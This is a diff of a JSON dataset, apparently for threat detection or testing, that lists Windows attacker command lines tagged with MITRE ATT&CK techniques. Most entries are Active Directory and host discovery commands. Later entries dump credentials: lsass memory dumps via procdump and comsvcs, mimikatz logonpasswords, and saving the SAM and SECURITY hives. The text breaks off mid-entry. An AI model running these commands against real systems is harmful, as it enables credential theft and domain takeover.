@@ -1,6 +1,6 @@
 [
     {
-        "ID":1935,
+        "ID":1,
         "Command":"systeminfo",
         "Description":null,
         "RiskScore":null,
@@ -8,10 +8,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1936,
+        "ID":2,
         "Command":"net config workstation",
         "Description":null,
         "RiskScore":null,
@@ -19,10 +20,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1937,
+        "ID":3,
         "Command":"tasklist \/svc",
         "Description":null,
         "RiskScore":null,
@@ -30,10 +32,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1938,
+        "ID":4,
         "Command":"ping -n 1 <remote_host>",
         "Description":null,
         "RiskScore":null,
@@ -41,10 +44,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1939,
+        "ID":5,
         "Command":"net view",
         "Description":null,
         "RiskScore":null,
@@ -52,10 +56,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1940,
+        "ID":6,
         "Command":"wmic product get name",
         "Description":null,
         "RiskScore":null,
@@ -63,10 +68,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1941,
+        "ID":7,
         "Command":"wmic os caption",
         "Description":null,
         "RiskScore":null,
@@ -74,10 +80,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1942,
+        "ID":8,
         "Command":"wmic process | find <security_product_process>",
         "Description":null,
         "RiskScore":null,
@@ -85,10 +92,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1943,
+        "ID":9,
         "Command":"wmic volume list brief",
         "Description":null,
         "RiskScore":null,
@@ -96,10 +104,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1944,
+        "ID":10,
         "Command":"wmic service brief",
         "Description":null,
         "RiskScore":null,
@@ -107,10 +116,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1945,
+        "ID":11,
         "Command":"wmic product list brief",
         "Description":null,
         "RiskScore":null,
@@ -118,10 +128,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1946,
+        "ID":12,
         "Command":"wmic baseboard list full",
         "Description":null,
         "RiskScore":null,
@@ -129,10 +140,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1947,
+        "ID":13,
         "Command":"netsh interface firewall show all",
         "Description":null,
         "RiskScore":null,
@@ -140,10 +152,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1948,
+        "ID":14,
         "Command":"netsh interface portproxy show all",
         "Description":null,
         "RiskScore":null,
@@ -151,10 +164,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1949,
+        "ID":15,
         "Command":"netsh interface portproxy show v4tov4",
         "Description":null,
         "RiskScore":null,
@@ -162,10 +176,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1950,
+        "ID":16,
         "Command":"netsh firewall show all",
         "Description":null,
         "RiskScore":null,
@@ -173,10 +188,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1951,
+        "ID":17,
         "Command":"netsh portproxy show v4tov4",
         "Description":null,
         "RiskScore":null,
@@ -184,10 +200,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1952,
+        "ID":18,
         "Command":"reg query hklm\\software\\",
         "Description":null,
         "RiskScore":null,
@@ -195,10 +212,11 @@
         "MitreAttackClassification":"T1082",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1953,
+        "ID":19,
         "Command":"ipconfig \/all",
         "Description":null,
         "RiskScore":null,
@@ -206,10 +224,11 @@
         "MitreAttackClassification":"T1049",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1954,
+        "ID":20,
         "Command":"route print",
         "Description":null,
         "RiskScore":null,
@@ -217,10 +236,11 @@
         "MitreAttackClassification":"T1049",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1955,
+        "ID":21,
         "Command":"arp -a",
         "Description":null,
         "RiskScore":null,
@@ -228,10 +248,11 @@
         "MitreAttackClassification":"T1049",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1956,
+        "ID":22,
         "Command":"netstat -an",
         "Description":null,
         "RiskScore":null,
@@ -239,10 +260,11 @@
         "MitreAttackClassification":"T1049",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1957,
+        "ID":23,
         "Command":"qwinsta",
         "Description":null,
         "RiskScore":null,
@@ -250,10 +272,11 @@
         "MitreAttackClassification":"T1049",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1958,
+        "ID":24,
         "Command":"nslookup MACHINE_DOMAIN_NAME",
         "Description":null,
         "RiskScore":null,
@@ -261,10 +284,11 @@
         "MitreAttackClassification":"T1049",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1959,
+        "ID":25,
         "Command":"net accounts \/domain",
         "Description":null,
         "RiskScore":null,
@@ -272,10 +296,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1960,
+        "ID":26,
         "Command":"net user <user_name> \/domain",
         "Description":null,
         "RiskScore":null,
@@ -283,10 +308,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1961,
+        "ID":27,
         "Command":"net user Administrator \/domain",
         "Description":null,
         "RiskScore":null,
@@ -294,10 +320,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1962,
+        "ID":28,
         "Command":"nltest dclist:",
         "Description":null,
         "RiskScore":null,
@@ -305,10 +332,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1963,
+        "ID":29,
         "Command":"nltest \/domain_trusts \/all_trusts",
         "Description":null,
         "RiskScore":null,
@@ -316,10 +344,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1964,
+        "ID":30,
         "Command":"net config workstation",
         "Description":null,
         "RiskScore":null,
@@ -327,10 +356,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1965,
+        "ID":31,
         "Command":"net groups \/domain",
         "Description":null,
         "RiskScore":null,
@@ -338,10 +368,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1966,
+        "ID":32,
         "Command":"net group \"domain controllers\" \/domain",
         "Description":null,
         "RiskScore":null,
@@ -349,10 +380,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1967,
+        "ID":33,
         "Command":"net group \"Domain Admins\" \/domain",
         "Description":null,
         "RiskScore":null,
@@ -360,10 +392,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1968,
+        "ID":34,
         "Command":"net group \"domain computers\" \/domain",
         "Description":null,
         "RiskScore":null,
@@ -371,10 +404,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1969,
+        "ID":35,
         "Command":"net group \"enterprise admins\" \/dom",
         "Description":null,
         "RiskScore":null,
@@ -382,10 +416,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1970,
+        "ID":36,
         "Command":"net localgroup \"administrators\" \/dom",
         "Description":null,
         "RiskScore":null,
@@ -393,10 +428,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1971,
+        "ID":37,
         "Command":"net time \/domain",
         "Description":null,
         "RiskScore":null,
@@ -404,10 +440,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1972,
+        "ID":38,
         "Command":"net share",
         "Description":null,
         "RiskScore":null,
@@ -415,10 +452,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1973,
+        "ID":39,
         "Command":"setspn.exe -F -Q *\/*",
         "Description":null,
         "RiskScore":null,
@@ -426,10 +464,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1974,
+        "ID":40,
         "Command":"dsquery group -name \"<groupname>\" | dsget group -members",
         "Description":null,
         "RiskScore":null,
@@ -437,10 +476,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1975,
+        "ID":41,
         "Command":"Get-MsolUser <user>",
         "Description":null,
         "RiskScore":null,
@@ -448,10 +488,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1976,
+        "ID":42,
         "Command":"Get-MsolUser -UserPrincipalName <user>",
         "Description":null,
         "RiskScore":null,
@@ -459,10 +500,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1977,
+        "ID":43,
         "Command":"adfind -gcb -sc trustdmp",
         "Description":null,
         "RiskScore":null,
@@ -470,10 +512,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1978,
+        "ID":44,
         "Command":"adfind f \"(objectcategory=group)\"",
         "Description":null,
         "RiskScore":null,
@@ -481,10 +524,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1979,
+        "ID":45,
         "Command":"adfind -subnets -f (objectCategory=subnet)",
         "Description":null,
         "RiskScore":null,
@@ -492,10 +536,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1980,
+        "ID":46,
         "Command":"adfind -f (objectcategory=organizationalUnit)",
         "Description":null,
         "RiskScore":null,
@@ -503,10 +548,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1981,
+        "ID":47,
         "Command":"adfind -f objectcategory=computer -csv name operatingSystem",
         "Description":null,
         "RiskScore":null,
@@ -514,10 +560,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1982,
+        "ID":48,
         "Command":"adfind -f objectcategory=computer",
         "Description":null,
         "RiskScore":null,
@@ -525,10 +572,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1983,
+        "ID":49,
         "Command":"adfind -f (objectcategory=person)",
         "Description":null,
         "RiskScore":null,
@@ -536,10 +584,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1984,
+        "ID":50,
         "Command":"adexplorer -snapshot",
         "Description":null,
         "RiskScore":null,
@@ -547,10 +596,11 @@
         "MitreAttackClassification":"T1087.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1985,
+        "ID":51,
         "Command":"nltest \/domain_trusts",
         "Description":null,
         "RiskScore":null,
@@ -558,10 +608,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1986,
+        "ID":52,
         "Command":"nltest \/dclist:<victim_domain>",
         "Description":null,
         "RiskScore":null,
@@ -569,10 +620,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1987,
+        "ID":53,
         "Command":"netdom trust <domain_name>",
         "Description":null,
         "RiskScore":null,
@@ -580,10 +632,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1988,
+        "ID":54,
         "Command":"dsquery * -filter \"(objectClass=trustedDomain)\"",
         "Description":null,
         "RiskScore":null,
@@ -591,10 +644,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1989,
+        "ID":55,
         "Command":"net view \/domain",
         "Description":null,
         "RiskScore":null,
@@ -602,10 +656,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1990,
+        "ID":56,
         "Command":"dsget domain <domain_name> -trus",
         "Description":null,
         "RiskScore":null,
@@ -613,10 +668,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1991,
+        "ID":57,
         "Command":"Get-ADTrust -Filter *",
         "Description":null,
         "RiskScore":null,
@@ -624,10 +680,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1992,
+        "ID":58,
         "Command":"Get-NetDomainTrust",
         "Description":null,
         "RiskScore":null,
@@ -635,10 +692,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1993,
+        "ID":59,
         "Command":"Get-ADDomainController -Discover",
         "Description":null,
         "RiskScore":null,
@@ -646,10 +704,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1994,
+        "ID":60,
         "Command":"Test-NetConnection -ComputerName <domain_controller_name>",
         "Description":null,
         "RiskScore":null,
@@ -657,10 +716,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1995,
+        "ID":61,
         "Command":"Get-NetForestDomain",
         "Description":null,
         "RiskScore":null,
@@ -668,10 +728,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1996,
+        "ID":62,
         "Command":"Get-ADDomain <domain_name> | Select-Object Name, Trusts",
         "Description":null,
         "RiskScore":null,
@@ -679,10 +740,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1997,
+        "ID":63,
         "Command":"Get-ADTrustRelationship -Domain <domain_name>",
         "Description":null,
         "RiskScore":null,
@@ -690,10 +752,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1998,
+        "ID":64,
         "Command":"reg query",
         "Description":null,
         "RiskScore":null,
@@ -701,10 +764,11 @@
         "MitreAttackClassification":"T1012",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":1999,
+        "ID":65,
         "Command":"hkcu\\<domain_user_sid>\\Software\\Microsoft\\Office\\14.0\\ Outlook \/s | find \"<victim_domain_name>\"",
         "Description":null,
         "RiskScore":null,
@@ -712,10 +776,11 @@
         "MitreAttackClassification":"T1012",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2000,
+        "ID":66,
         "Command":"cmd \/c tasklist",
         "Description":null,
         "RiskScore":null,
@@ -723,10 +788,11 @@
         "MitreAttackClassification":"T1012",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2001,
+        "ID":67,
         "Command":"wmic process | find \"<process_name>\"",
         "Description":null,
         "RiskScore":null,
@@ -734,10 +800,11 @@
         "MitreAttackClassification":"T1012",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2002,
+        "ID":68,
         "Command":"cmd \/c wmic product get name",
         "Description":null,
         "RiskScore":null,
@@ -745,10 +812,11 @@
         "MitreAttackClassification":"T1018",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2003,
+        "ID":69,
         "Command":"dir \\\\<ip>\\c$\\windows\\system32\\tasks",
         "Description":null,
         "RiskScore":null,
@@ -756,10 +824,11 @@
         "MitreAttackClassification":"T1018",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2004,
+        "ID":70,
         "Command":"ping <domain_name>",
         "Description":null,
         "RiskScore":null,
@@ -767,10 +836,11 @@
         "MitreAttackClassification":"T1018",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2005,
+        "ID":71,
         "Command":"ping <ip_address>",
         "Description":null,
         "RiskScore":null,
@@ -778,10 +848,11 @@
         "MitreAttackClassification":"T1018",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2006,
+        "ID":72,
         "Command":"(&(&(&(objectClass=Computer)(dnshostname=*))(operatingsystem=*))(servicePrincipalName=*))",
         "Description":null,
         "RiskScore":null,
@@ -789,10 +860,11 @@
         "MitreAttackClassification":"T1018",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2007,
+        "ID":73,
         "Command":"cmd.exe \/C net group \"domain admins\" \/domain\"",
         "Description":null,
         "RiskScore":null,
@@ -800,10 +872,11 @@
         "MitreAttackClassification":"T1135",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2008,
+        "ID":74,
         "Command":"cmd.exe \/C net group \/d",
         "Description":null,
         "RiskScore":null,
@@ -811,10 +884,11 @@
         "MitreAttackClassification":"T1135",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2009,
+        "ID":75,
         "Command":"net group \"domain computers\" \/do",
         "Description":null,
         "RiskScore":null,
@@ -822,10 +896,11 @@
         "MitreAttackClassification":"T1069",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2010,
+        "ID":76,
         "Command":"nltest \/dclists",
         "Description":null,
         "RiskScore":null,
@@ -833,10 +908,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2011,
+        "ID":77,
         "Command":"nltest \/domain_trusts",
         "Description":null,
         "RiskScore":null,
@@ -844,10 +920,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2012,
+        "ID":78,
         "Command":"nltest \/dclist:<domain>",
         "Description":null,
         "RiskScore":null,
@@ -855,10 +932,11 @@
         "MitreAttackClassification":"T1482",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2013,
+        "ID":79,
         "Command":"procdump.exe -accepteula -ma lsass.exe \u0421:\\Windows\\Temp\\mem.dmp",
         "Description":null,
         "RiskScore":null,
@@ -866,10 +944,11 @@
         "MitreAttackClassification":"T1003.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2014,
+        "ID":80,
         "Command":"procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\mem.dmp",
         "Description":null,
         "RiskScore":null,
@@ -877,10 +956,11 @@
         "MitreAttackClassification":"T1003.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2015,
+        "ID":81,
         "Command":"cmd.exe \/C tasklist \/svc | findstr lsass",
         "Description":null,
         "RiskScore":null,
@@ -888,10 +968,11 @@
         "MitreAttackClassification":"T1003.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2016,
+        "ID":82,
         "Command":"rundll32.exe c:\\Windows\\System32\\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\\windows\\temp\\lsass.dmp full",
         "Description":null,
         "RiskScore":null,
@@ -899,10 +980,11 @@
         "MitreAttackClassification":"T1003.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2017,
+        "ID":83,
         "Command":"msdol.exe privilege::debug sekurlsa::logonpasswords exit",
         "Description":null,
         "RiskScore":null,
@@ -910,10 +992,11 @@
         "MitreAttackClassification":"T1003.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2018,
+        "ID":84,
         "Command":"sekurlsa::Minidump lsassdump.dmp",
         "Description":null,
         "RiskScore":null,
@@ -921,10 +1004,11 @@
         "MitreAttackClassification":"T1003.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2019,
+        "ID":85,
         "Command":"cmd.exe \/C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > \"c:\\pathtooutfile\\<output_file>.txt\"",
         "Description":null,
         "RiskScore":null,
@@ -932,10 +1016,11 @@
         "MitreAttackClassification":"T1003.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2020,
+        "ID":86,
         "Command":"cmd.exe powershell -ep bypass -C \"import-module .\\katz.ps1;Invoke-Katz\" > <output_file>.txt",
         "Description":null,
         "RiskScore":null,
@@ -943,10 +1028,11 @@
         "MitreAttackClassification":"T1003.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2021,
+        "ID":87,
         "Command":"reg save hklm\\sam sam.hive",
         "Description":null,
         "RiskScore":null,
@@ -954,10 +1040,11 @@
         "MitreAttackClassification":"T1003.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2022,
+        "ID":88,
         "Command":"reg save hklm\\system sys",
         "Description":null,
         "RiskScore":null,
@@ -965,10 +1052,11 @@
         "MitreAttackClassification":"T1003.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2023,
+        "ID":89,
         "Command":"reg save hklm\\security sec",
         "Description":null,
         "RiskScore":null,
@@ -976,10 +1064,11 @@
         "MitreAttackClassification":"T1003.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2024,
+        "ID":90,
         "Command":"tasklist.exe \/svc",
         "Description":null,
